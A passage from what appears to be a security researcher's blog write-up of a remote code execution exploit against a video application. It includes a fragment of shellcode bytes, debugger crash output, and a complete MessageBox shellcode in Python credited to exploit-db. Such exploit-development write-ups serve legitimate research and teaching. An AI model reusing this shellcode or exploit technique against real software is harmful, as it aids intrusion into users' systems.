"\xa0\xa3\x69\x85\x63\x80\x86\xcf\x2e\xa0\x0e\x96\xba\xf1" +
"\x52\x29\x11\x35\x6b\xaa\x90\xc5\x88\xb2\xd0\xc0\xd5\x74" +
"\x08\xb8\x46\x11\x2e\x6f\x66\x30\x4d\xee\xf4\xd8\xbc\x95" +
"\x7c\x7a\xc1")
{% endhighlight %}

...but noticed that the application crashes using an unhandled exception, but starts the calc.exe in some kind of "broken" state:

[![videocharge-rce-17]({{ site.baseurl }}/assets/videocharge-rce-17-1024x516.png)]({{ site.baseurl }}/assets/videocharge-rce-17.png)

Immunity Debugger reports the following unhandled exception in ntdll.dll:

{% highlight text %}
Log data, item 0
Address=75E0C41F
Message=[23:26:01] Exception 800401F0
{% endhighlight %}

[![videocharge-rce-18]({{ site.baseurl }}/assets/videocharge-rce-18-1024x752.png)]({{ site.baseurl }}/assets/videocharge-rce-18.png)

That's the reason why I have used the small MessageBox shellcode from </span>[Giuseppe D'Amore](http://www.exploit-db.com/exploits/28996/) <span style="line-height: 1.428571429;">here, which works perfectly on Windows 7 x64 German:

{% highlight python %}
shellcode = ("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"+
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"+
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"+
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"+
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7")
{% endhighlight %}

If someone likes to investigate the root-cause for this issue, feel free and leave a message below this post :-)
